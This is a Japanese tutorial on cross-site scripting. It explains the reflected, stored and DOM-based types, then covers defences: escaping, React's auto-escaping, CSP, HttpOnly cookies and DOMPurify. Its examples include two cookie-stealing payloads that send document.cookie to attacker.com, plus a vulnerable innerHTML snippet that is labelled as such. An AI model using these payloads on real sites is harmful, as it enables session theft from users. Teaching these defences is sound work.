## XSSとは

**XSS（Cross-Site Scripting）**は攻撃者が悪意のあるJavaScriptコードをWebページに埋め込む攻撃です。被害者のブラウザで攻撃者のコードが実行されます。

## XSSの種類

### 反射型XSS（Reflected XSS）

URLパラメータなどを通じてページに反映される：

```
攻撃URL: https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

このURLをクリックするとクッキーが盗まれる可能性があります。

### 格納型XSS（Stored XSS）

DBに悪意のあるコードが保存され、閲覧者全員に実行される：

```html
<!-- 掲示板の投稿内容にスクリプトを含める -->
<script>fetch('https://attacker.com/steal?data=' + document.cookie)</script>
```

最も危険なXSSです。

### DOM Based XSS

JavaScriptがDOMを操作する際に発生：

```javascript
// 脆弱なコード
const userInput = location.hash.slice(1); // URLのハッシュ部分
document.getElementById("output").innerHTML = userInput; // HTMLとして挿入
// → URLのハッシュに<script>を含めると実行される
```

## 対策

### 1. HTMLエスケープ

ユーザー入力をHTMLとして出力する前にエスケープ：

```javascript
// 手動でエスケープ（通常はフレームワークが自動でやる）
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// ❌ XSS脆弱
element.innerHTML = userInput;

// ✅ 安全（テキストとして扱う）
element.textContent = userInput;
```

### 2. フレームワークの自動エスケープを活用

ReactはデフォルトでJSXの変数をエスケープします：

```jsx
// ✅ 自動エスケープ
<p>{userInput}</p>

// ❌ dangerouslySetInnerHTMLは慎重に
<p dangerouslySetInnerHTML={{ __html: userInput }} />
// → 本当にHTMLが必要な場合はサニタイズを必ず行う
```

### 3. Content Security Policy（CSP）

HTTPヘッダーでスクリプトの実行を制限：

```javascript
// Next.jsでのCSP設定
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
`;
```

### 4. HttpOnly Cookie

JavaScriptからCookieにアクセスできなくする：

```javascript
res.cookie("sessionId", token, {
  httpOnly: true,   // JavaScriptからアクセス不可
  secure: true,     // HTTPSのみ送信
  sameSite: "strict", // CSRF対策も兼ねる
  maxAge: 3600000,
});
```

### 5. DOMPurifyでHTMLをサニタイズ

どうしてもHTMLを埋め込む必要がある場合：

```javascript
import DOMPurify from "dompurify";

const cleanHtml = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "p"],
  ALLOWED_ATTR: [],
});
element.innerHTML = cleanHtml;
```

<Callout type="warning" title="innerHTMLへの代入は常に要注意">
`element.innerHTML = userInput` は極めて危険な操作です。ユーザー入力を表示するときは常に`textContent`を使い、HTMLが必要な場合のみDOMPurifyでサニタイズした上で`innerHTML`を使います。
</Callout>

## まとめ

- XSSは攻撃者のスクリプトを被害者のブラウザで実行させる攻撃
- 反射型・格納型・DOM BasedのXSSがある
- `textContent`を使い、HTMLが必要ならDOMPurifyでサニタイズ
- Reactなどのフレームワークは自動エスケープするが`dangerouslySetInnerHTML`は危険
- CSPとHttpOnly Cookieで多層防御する
